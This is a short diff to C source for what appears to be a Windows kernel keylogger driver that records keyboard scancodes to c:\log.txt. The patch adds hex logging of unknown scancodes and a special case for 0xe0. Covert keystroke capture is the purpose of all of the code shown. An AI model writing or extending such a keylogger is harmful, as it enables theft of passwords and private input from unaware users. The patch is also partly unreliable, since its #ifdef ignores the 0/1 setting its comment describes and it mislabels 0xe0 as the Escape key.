@@ -15,6 +15,8 @@ ULONG			written;			// Total number of records written to the file.
 #define			LOG_TRIGGER_POINT 16		// Value at which the writing work item fires.
 
 #define			LOG_FILE_PATH "c:\\log.txt"	// Path to the log file. Path should exists (not tested)
+
+#define			LOG_UNKNOWN_CODES 1		// Whatever to log unknown scancodes as hexadecimal (if 1) or as N/A (if 0)
 // End of configuration
 
 #define			SZ_KEYTABLE 0x59		// Size of the scancodes table below.
@@ -333,9 +335,18 @@ WriteToLogFile
 		{
 			strcat(writeBuffer, asciiRepr);
 		}
+		else if (scancode == 0xe0)
+		{
+			// e0 = Escape character
+			strcat(writeBuffer, "[ESC]");
+		}
 		else
 		{
+			#ifdef LOG_UNKNOWN_CODES
+			sprintf(writeBuffer + strlen(writeBuffer), "[%02x]", scancode);
+			#else
 			strcat(writeBuffer, "[N/A]");
+			#endif
 		}
 
 		if (flags == KEY_MAKE)
